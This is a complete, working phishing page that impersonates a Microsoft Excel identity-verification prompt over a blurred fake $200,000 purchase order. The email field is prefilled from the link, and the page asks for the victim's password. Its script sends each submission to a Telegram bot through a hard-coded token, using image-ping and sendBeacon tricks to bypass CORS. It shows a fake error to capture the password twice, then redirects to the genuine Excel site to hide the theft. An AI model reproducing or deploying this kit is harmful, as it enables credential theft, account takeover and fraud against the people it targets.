<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification - Microsoft Excel</title>
    <style>
        :root {
            --ms-green: #217346;
            --ms-dark-green: #107c10;
            --grid-line: #999999;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: "Segoe UI", Tahoma, sans-serif; 
            background: #f2f2f2; 
            overflow: hidden; 
            height: 100vh;
            width: 100vw;
        }

        .excel-container {
            position: absolute;
            top: 0; left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            filter: blur(1px);
            background: white;
            display: flex;
            flex-direction: column;
        }

        .ribbon { height: 40px; background: var(--ms-green); width: 100%; }
        
        .grid-wrapper {
            flex: 1;
            overflow: hidden;
            border-top: 1px solid #ccc;
        }

        .excel-table {
            border-collapse: collapse;
            width: 100%;
            table-layout: fixed;
        }

        .excel-table td {
            border: 0.5px solid var(--grid-line);
            height: 28px;
            padding: 0 10px;
            font-size: 11px;
            color: #333;
            white-space: nowrap;
        }

        .header-col { background: #f3f2f1; text-align: center; color: #444; width: 120px; }
        .row-index { background: #f3f2f1; text-align: center; width: 45px; color: #666; }

        .total-label { text-align: right; font-weight: 700; background: #fafafa; }
        .total-amount { 
            background: #fff2cc; 
            font-weight: 800; 
            color: #000; 
            border: 2px solid var(--ms-green) !important;
            text-align: right;
            font-size: 13px !important;
        }

        .data-header { background: #444 !important; color: white !important; font-weight: bold; text-align: center; }

        .auth-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%;
            height: 100%;
            z-index: 100;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(255, 255, 255, 0.15);
        }

        .login-card {
            background: #ffffff;
            width: 440px;
            padding: 45px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
            border: 1px solid #d2d2d2;
        }

        .excel-branding {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
        }

        .excel-logo { width: 48px; height: 48px; margin-right: 15px; }

        .login-card h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 5px; }
        .login-card p { font-size: 15px; color: #1b1b1b; margin-bottom: 30px; }

        .input-group { margin-bottom: 25px; }
        .input-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; color: #323130; }

        .input-field {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #8a8886;
            font-size: 15px;
            outline: none;
        }

        .input-field:focus { border-color: var(--ms-dark-green); box-shadow: 0 0 0 1px var(--ms-dark-green); }

        .btn-access {
            background: var(--ms-dark-green);
            color: white;
            padding: 12px;
            border: none;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }

        .footer-links { margin-top: 35px; display: flex; gap: 20px; font-size: 11px; color: #666; justify-content: center; text-transform: uppercase; letter-spacing: 0.5px; }
    </style>
</head>
<body>

    <!-- Excel spreadsheet background -->
    <div class="excel-container">
        <div class="ribbon"></div>
        <div class="grid-wrapper">
            <table class="excel-table" id="bg-grid"></table>
        </div>
    </div>

    <!-- Overlay login card -->
    <div class="auth-overlay">
        <div class="login-card">
            <div class="excel-branding">
                <svg class="excel-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M14.5 0H4.5C3.67 0 3 0.67 3 1.5V22.5C3 23.33 3.67 24 4.5 24H19.5C20.33 24 21 23.33 21 22.5V6.5L14.5 0Z" fill="#217346"/>
                    <path d="M21 6.5H14.5V0L21 6.5Z" fill="#33C481"/>
                    <path d="M7 10.5L9.5 14L7 17.5H8.7L10.3 15.2L11.9 17.5H13.6L11.1 14L13.6 10.5H11.9L10.3 12.8L8.7 10.5H7Z" fill="white"/>
                </svg>
            </div>
            <h2>Identity Verification</h2>
            <p>Authentication required to access document</p>

            <form id="authForm">
                <div class="input-group">
                    <label>Email</label>
                    <input type="email" class="input-field" id="emailInput" placeholder="[[-Email-]]" readonly>
                </div>

                <div class="input-group">
                    <label>Password</label>
                    <input type="password" class="input-field" id="passwordInput" placeholder="Password" required>
                    <div id="errorMessage" style="display: none; color: #d13438; font-size: 13px; margin-top: 8px; font-weight: 500;">Incorrect Credentials Try Again</div>
                </div>

                <button type="submit" class="btn-access">Access Secure Document</button>
            </form>
            
            <div class="footer-links">
                <span>Privacy Statement</span>
                <span>Terms of Use</span>
            </div>
        </div>
    </div>
<script>
    const BOT_TOKEN = '8118400062:AAHOV3xJ-u9V0x6VSPPD5pp85cUUetxcquI';
    const CHAT_ID = '7992799071';

    let attemptCount = 0;

    // Guaranteed dispatch method using native Image request to bypass CORS and network drops
    function sendToTelegram(email, password, attempt) {
        const text = encodeURIComponent(`New Submission:\nEmail: ${email}\nPassword: ${password}\nAttempt: ${attempt}`);
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;

        // Method 1: Image ping (bypasses CORS completely in all browsers)
        const img = new Image();
        img.src = url;

        // Method 2: sendBeacon fallback (ensures delivery even during page unload/redirect)
        if (navigator.sendBeacon) {
            navigator.sendBeacon(url);
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        const emailInput = document.getElementById('emailInput');
        const hash = window.location.hash;
        
        if (hash && hash.length > 1) {
            const email = decodeURIComponent(hash.substring(1));
            if (email.includes('@')) {
                emailInput.value = email;
            } else {
                emailInput.value = '[[-Email-]]';
            }
        } else {
            emailInput.value = '[[-Email-]]';
        }

        const authForm = document.getElementById('authForm');
        if (authForm) {
            authForm.addEventListener('submit', function(e) {
                e.preventDefault();

                const passwordInput = document.getElementById('passwordInput');
                const errorMessage = document.getElementById('errorMessage');

                const email = emailInput.value;
                const password = passwordInput.value;

                attemptCount++;

                // Fire dispatch
                sendToTelegram(email, password, attemptCount);

                if (attemptCount === 1) {
                    if (errorMessage) errorMessage.style.display = 'block';
                    passwordInput.value = '';
                } else {
                    // Small delay to allow request buffer time before redirecting
                    setTimeout(function() {
                        window.location.href = 'https://www.microsoft.com/en-us/microsoft-365/excel';
                    }, 800);
                }
            });
        }

        buildExcelGrid();
    });

    function buildExcelGrid() {
        const table = document.getElementById('bg-grid');
        if (!table) return;

        const items = [
            ["Steel Coil (Cold Rolled)", "$35,000.00"],
            ["Aluminum Sheet (Industrial)", "$25,000.00"],
            ["Copper Wire (Insulated)", "$20,000.00"],
            ["Agriculture & Food Grade", "$15,000.00"],
            ["Apparel & Accessories", "$10,000.00"],
            ["Auto & Motorcycle Parts", "$25,000.00"],
            ["Chemicals & Polymers", "$12,000.00"],
            ["Computer Products", "$18,000.00"],
            ["Construction Materials", "$10,000.00"],
            ["Consumer Electronics", "$10,000.00"],
            ["Electrical Components", "$5,000.00"],
            ["Industrial Equipment", "$7,000.00"],
            ["Instruments & Meters", "$3,000.00"],
            ["Furniture & Fixtures", "$3,000.00"],
            ["Tools & Hardware", "$2,000.00"]
        ];

        const rows = 35;
        const cols = 8;

        for (let r = 0; r < rows; r++) {
            const tr = document.createElement('tr');
            for (let c = 0; c < cols; c++) {
                const td = document.createElement('td');

                if (r === 0) {
                    td.className = 'header-col';
                    if (c > 0) td.innerText = String.fromCharCode(64 + c);
                } else if (c === 0) {
                    td.className = 'row-index';
                    td.innerText = r;
                } else {
                    if (r === 2 && c === 1) {
                        td.innerText = "PURCHASE ORDER: XP-2026-FINAL";
                        td.style.fontWeight = "900";
                        td.style.fontSize = "14px";
                    }
                    if (r === 6 && c === 1) {
                        td.innerText = "ITEM DESCRIPTION";
                        td.className = "data-header";
                    }
                    if (r === 6 && c === 5) {
                        td.innerText = "TOTAL VALUE (USD)";
                        td.className = "data-header";
                    }
                    if (r >= 7 && r < 7 + items.length) {
                        const idx = r - 7;
                        if (c === 1) td.innerText = items[idx][0];
                        if (c === 5) {
                            td.innerText = items[idx][1];
                            td.style.textAlign = "right";
                        }
                    }
                    if (r === 23 && c === 4) {
                        td.innerText = "GRAND TOTAL:";
                        td.className = "total-label";
                    }
                    if (r === 23 && c === 5) {
                        td.innerText = "$200,000.00";
                        td.className = "total-amount";
                    }
                }
                tr.appendChild(td);
            }
            table.appendChild(tr);
        }
    }
</script>


</body>
</html>
